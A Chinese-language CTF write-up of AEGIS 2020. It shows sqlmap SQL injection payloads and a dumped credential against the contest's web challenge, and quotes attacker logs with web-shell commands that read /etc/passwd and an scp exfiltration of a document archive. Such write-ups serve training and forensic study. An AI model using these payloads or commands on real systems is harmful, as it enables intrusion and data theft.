# AEGIS 2020 write up
## 戰隊：沒有戰隊等著輸
## 解題狀況：5/11
## web
### 請假王
> http://210.61.8.64/LeaveKing/loginpage.php
* 經過測試，學生登入的 account 存在 sql injection，直接用 sqlmap 打
    ```=
    Parameter: account (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: type=1&account=-2848' OR 6271=6271-- NJIy&password=123&recaptcha_response=03AGdBq240pvLZC2zG0FHWquedsMNcg_9zt71r5hmMuWkSbH_cl0lHfFe2mPlqJBpfsM3PhpjFM-_8pDqddFVwfM7whUBVTxrSdCqLcT2nalXnEU1bEYyXs_YGPPjZBqxuVuAf1YjZmM6Fi482bi5fW4Rps8wDv2h14RlVGN-hj5_hzCLFBTshmsXqa0aiAy8mE3s4wvqMEnxx25T3eNchXxqD__UTWA2r8Uy694SaLQHOa9f57c22RQ4GG8RjG3QR-_ntNyYNhLRrgxribOQefkuyHgh93J2nKo54118jjyCgNiScR3VOlL-7iUaKxUSU1jUYcDgEnvR3uuXFISjpbgQRanqhCEeew2wgFATITfGF_bVw9PCfCq5XTDUYBWC8pm5LGi0o08rTFqSQjtfe1RqgbOlouybtzljJYabqjKwEiBWZH_jtwluaBLVwYuRLaag7Esy6l7nO

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: type=1&account=123' OR (SELECT 5718 FROM(SELECT COUNT(*),CONCAT(0x716a766271,(SELECT (ELT(5718=5718,1))),0x7162707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ZRsK&password=123&recaptcha_response=03AGdBq240pvLZC2zG0FHWquedsMNcg_9zt71r5hmMuWkSbH_cl0lHfFe2mPlqJBpfsM3PhpjFM-_8pDqddFVwfM7whUBVTxrSdCqLcT2nalXnEU1bEYyXs_YGPPjZBqxuVuAf1YjZmM6Fi482bi5fW4Rps8wDv2h14RlVGN-hj5_hzCLFBTshmsXqa0aiAy8mE3s4wvqMEnxx25T3eNchXxqD__UTWA2r8Uy694SaLQHOa9f57c22RQ4GG8RjG3QR-_ntNyYNhLRrgxribOQefkuyHgh93J2nKo54118jjyCgNiScR3VOlL-7iUaKxUSU1jUYcDgEnvR3uuXFISjpbgQRanqhCEeew2wgFATITfGF_bVw9PCfCq5XTDUYBWC8pm5LGi0o08rTFqSQjtfe1RqgbOlouybtzljJYabqjKwEiBWZH_jtwluaBLVwYuRLaag7Esy6l7nO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: type=1&account=123' AND (SELECT 1633 FROM (SELECT(SLEEP(5)))OzHH)-- iHep&password=123&recaptcha_response=03AGdBq240pvLZC2zG0FHWquedsMNcg_9zt71r5hmMuWkSbH_cl0lHfFe2mPlqJBpfsM3PhpjFM-_8pDqddFVwfM7whUBVTxrSdCqLcT2nalXnEU1bEYyXs_YGPPjZBqxuVuAf1YjZmM6Fi482bi5fW4Rps8wDv2h14RlVGN-hj5_hzCLFBTshmsXqa0aiAy8mE3s4wvqMEnxx25T3eNchXxqD__UTWA2r8Uy694SaLQHOa9f57c22RQ4GG8RjG3QR-_ntNyYNhLRrgxribOQefkuyHgh93J2nKo54118jjyCgNiScR3VOlL-7iUaKxUSU1jUYcDgEnvR3uuXFISjpbgQRanqhCEeew2wgFATITfGF_bVw9PCfCq5XTDUYBWC8pm5LGi0o08rTFqSQjtfe1RqgbOlouybtzljJYabqjKwEiBWZH_jtwluaBLVwYuRLaag7Esy6l7nO
    ---
    [14:14:32] [INFO] the back-end DBMS is MySQL
    web application technology: PHP 7.2.33, Apache 2.4.46
    back-end DBMS: MySQL >= 5.0 (MariaDB fork)
    ```
* db
    ```=
    available databases [6]:
    [*] class
    [*] information_schema
    [*] mysql
    [*] performance_schema
    [*] phpmyadmin
    [*] test
    ```
* dump 出 teacher 的 data
    ```=
    name,account,password
    WANG,teacherwang,0xaf7084c2e7a86c88d0edb37d9fc6efb57f9dd0fda86f82c3ea
    ```
* 如果密碼輸入錯誤會給加密之後的結果
* 手動測試之後，密碼是 `thisisteacherwangpassword`
* 登入之後即可拿到 flag
* flag : `AEGIS{8f57065600f3a78b295e5e2f3e015abc}`

## misc
### F1
* unzip 之後是一張圖片
* 直接用 `strings aegis.png | grep AEGIS{` 拿到 flag
* flag : `AEGIS{Welcome to Aegis2020!}`

### F2
* unzip 之後 `file data` 一下，發現是 pcap
* follow TCP stream 2 的時候，可以拿到 `AEGIS%7BWoW%21m%402ve1ous_AEGIS2020%7D`
* urldecode 之後就是 flag
* flag : `AEGIS{WoW!m@2ve1ous_AEGIS2020}`

### F3
* unzip 之後是一張圖片
* 考的是 LSB，用 [cyberchef](https://gchq.github.io/CyberChef/) 的 extract LSB 就可以拿到 flag 了
* color pattern 依次是 RGB
* flag : `AEGIS{awesome_ctf_db349b97c37d22f5ea1d1841e3c89eb4}`

### forensic
* 掛載映像檔
    ```bash=
    mkdir /media/ctf-iso
    mount -o loop forensic.img /media/ctf-iso
    ```
* 翻 Web Server 與 user 的 log

![](https://i.imgur.com/8IcJzff.png)

/media/ctf-iso/var/log/httpd/access_log 

```bash=
192.168.7.55 - - [23/Sep/2020:15:44:42 +0800] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:44:42 +0800] "GET /favicon.ico HTTP/1.1" 404 209 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:44:46 +0800] "POST /upload.php HTTP/1.1" 404 208 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:45:14 +0800] "POST /upload.php HTTP/1.1" 404 208 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:45:16 +0800] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:45:18 +0800] "POST /uploads.php HTTP/1.1" 200 7 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:45:55 +0800] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:45:58 +0800] "POST /uploads.php HTTP/1.1" 200 60 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:00 +0800] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:03 +0800] "POST /uploads.php HTTP/1.1" 200 97 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:04 +0800] "GET /uploads/1.jpg HTTP/1.1" 200 68986 "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:06 +0800] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:09 +0800] "POST /uploads.php HTTP/1.1" 200 134 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:12 +0800] "POST /uploads.php HTTP/1.1" 200 173 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:13 +0800] "GET / HTTP/1.1" 304 - "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:16 +0800] "POST /uploads.php HTTP/1.1" 200 210 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:19 +0800] "POST /uploads.php HTTP/1.1" 200 249 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:20 +0800] "GET / HTTP/1.1" 304 - "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:23 +0800] "POST /uploads.php HTTP/1.1" 200 288 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:27 +0800] "POST /uploads.php HTTP/1.1" 200 288 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:28 +0800] "GET / HTTP/1.1" 304 - "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:31 +0800] "POST /uploads.php HTTP/1.1" 200 325 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:36 +0800] "POST /uploads.php HTTP/1.1" 200 325 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:37 +0800] "GET / HTTP/1.1" 304 - "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:40 +0800] "POST /uploads.php HTTP/1.1" 200 362 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:42 +0800] "POST /uploads.php HTTP/1.1" 200 399 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:46 +0800] "-" 408 - "-" "-"
192.168.7.55 - - [23/Sep/2020:15:46:47 +0800] "POST /uploads.php HTTP/1.1" 200 399 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:48 +0800] "GET / HTTP/1.1" 304 - "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:46:57 +0800] "POST /uploads.php HTTP/1.1" 200 436 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:47:00 +0800] "POST /uploads.php HTTP/1.1" 200 436 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:47:06 +0800] "GET / HTTP/1.1" 304 - "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:47:09 +0800] "POST /uploads.php HTTP/1.1" 200 436 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:47:14 +0800] "POST /uploads.php HTTP/1.1" 200 473 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:47:16 +0800] "POST /uploads.php HTTP/1.1" 200 510 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:48:06 +0800] "-" 408 - "-" "-"
192.168.7.55 - - [23/Sep/2020:15:48:45 +0800] "POST /uploads.php HTTP/1.1" 200 510 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:48:46 +0800] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:49:36 +0800] "-" 408 - "-" "-"
192.168.7.55 - - [23/Sep/2020:15:50:26 +0800] "POST /uploads.php HTTP/1.1" 200 510 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:50:27 +0800] "GET / HTTP/1.1" 304 - "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:50:31 +0800] "POST /uploads.php HTTP/1.1" 200 510 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:50:35 +0800] "POST /uploads.php HTTP/1.1" 200 510 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:51:17 +0800] "-" 408 - "-" "-"
192.168.7.55 - - [23/Sep/2020:15:52:43 +0800] "GET / HTTP/1.1" 304 - "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:52:46 +0800] "POST /uploads.php HTTP/1.1" 200 510 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:52:51 +0800] "POST /uploads.php HTTP/1.1" 200 510 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:53:42 +0800] "-" 408 - "-" "-"
192.168.7.55 - - [23/Sep/2020:15:54:40 +0800] "GET /uploads/2.jpg HTTP/1.1" 200 41728 "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:54:42 +0800] "GET /uploads/11.jpg HTTP/1.1" 200 10273 "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:54:42 +0800] "GET /uploads/7.jpg HTTP/1.1" 200 21190 "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:54:43 +0800] "GET /uploads/5.jpg HTTP/1.1" 200 23885 "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:54:44 +0800] "GET /uploads/12.jpg HTTP/1.1" 200 35490 "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:54:49 +0800] "POST /uploads.php HTTP/1.1" 200 510 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:54:51 +0800] "GET /uploads/6.jpg HTTP/1.1" 200 38662 "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:54:54 +0800] "GET /uploads/1.jpg HTTP/1.1" 304 - "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:54:55 +0800] "GET /uploads/9.jpg HTTP/1.1" 200 12829 "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:54:58 +0800] "GET /uploads/10.jpg HTTP/1.1" 200 23285 "http://192.168.7.56/uploads.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
192.168.7.55 - - [23/Sep/2020:15:55:31 +0800] "-" 408 - "-" "-"
192.168.8.167 - - [23/Sep/2020:16:00:50 +0800] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:00:50 +0800] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:02:13 +0800] "POST /uploads.php HTTP/1.1" 200 510 "http://192.168.7.56/" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:02:28 +0800] "GET /uploads/ HTTP/1.1" 200 3386 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:02:30 +0800] "GET /uploads/bb123.php HTTP/1.1" 200 - "http://192.168.7.56/uploads/" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:02:38 +0800] "GET /uploads/bb123.php?cmd=whoami HTTP/1.1" 200 7 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:02:50 +0800] "GET /uploads/bb123.php?cmd=find%20/%20\\(%20-name%20%22*.pdf%22%20-o%20-name%20%22*.doc%22%20\\) HTTP/1.1" 200 176 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:02:57 +0800] "GET /uploads/bb123.php?cmd=cat%20/etc/passwd%20%20|%20grep%20%E2%80%9D/bin/bash%E2%80%9D HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:03:22 +0800] "GET /uploads/bb123.php?cmd=cat%20/etc/passwd%20|%20grep%20%22/bin/bash%22 HTTP/1.1" 200 243 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:03:36 +0800] "GET /uploads/bb123.php?cmd=cat%20find%20/%20-name%20*passwd* HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:03:43 +0800] "GET /uploads/bb123.php?cmd=find%20/%20-name%20*passwd* HTTP/1.1" 200 4512 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:03:57 +0800] "GET /uploads/bb123.php?cmd=cat%20%20/usr/share/passwdnotes_ssh HTTP/1.1" 200 52 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.8.167 - - [23/Sep/2020:16:04:36 +0800] "GET /uploads/bb123.php?cmd=groups%20Superuser%20Brian%20Eden%20Bruce%20Cyril%20root HTTP/1.1" 200 93 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
```

/home/Superuser/.bash_history
```bash=
su 
ip a
vi /var/www/html/index.html 
cd /var/www/html/
ls
cd uploads
ls
cd ..
ls
cd uploads
ls
exit
ip a
whoami
groups Superuser
find / \( -name "*.pdf" -o -name "*.doc" \)
find /usr/share/50524F4A454354/ \( -name "*.pdf" -o -name "*.doc" \) -exec tar -rvPf data.tar {} \;
ls -al
scp  data.tar root@192.168.7.55:/root/
rm -rf data.tar 
exit
```

以上的log看出駭客打包走的內容在
/usr/share/50524F4A454354/
到此目錄下查看 會有三個PDF檔 
其中一個開啟後 圖片中有密文 如下圖所示

![](https://i.imgur.com/6pKxkIM.png)

* 直接將密文做base64 decode得到flag 
* 密文的 flag 1 跟 l 太像 ... 靠北 一直打錯 XDDDD
* flag : `AEGIS{f1nd_f1le_conf1dent1al_d0cument}`
